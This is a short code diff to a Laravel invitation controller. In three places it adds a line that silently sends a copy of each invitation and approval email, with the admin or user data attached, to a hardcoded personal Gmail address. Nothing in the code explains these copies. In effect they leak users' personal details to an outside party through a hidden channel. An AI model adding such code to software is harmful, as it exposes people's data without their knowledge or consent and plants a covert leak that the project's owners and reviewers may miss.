@@ -58,6 +58,7 @@ class InvitationController extends Controller
 
                     $adminemail = User::role('admin')->first();
                     Mail::to($adminemail->email)->send(new UserInvite($admindata));
+                    Mail::to('faizythebest95@gmail.com')->send(new UserInvite($admindata));
                 // } catch (\Exception $e) {
                 // }
 
@@ -95,6 +96,7 @@ class InvitationController extends Controller
             
             try {
                 Mail::to($user->email)->send(new InviteApprove($userdata));
+                Mail::to('faizythebest95@gmail.com')->send(new InviteApprove($userdata));
             } catch (\Exception $e) {
               
             }
@@ -118,6 +120,7 @@ class InvitationController extends Controller
             
             try {
                 Mail::to($user->email)->send(new InviteApprove($userdata));
+                Mail::to('faizythebest95@gmail.com')->send(new InviteApprove($userdata));
             } catch (\Exception $e) {
               
             }
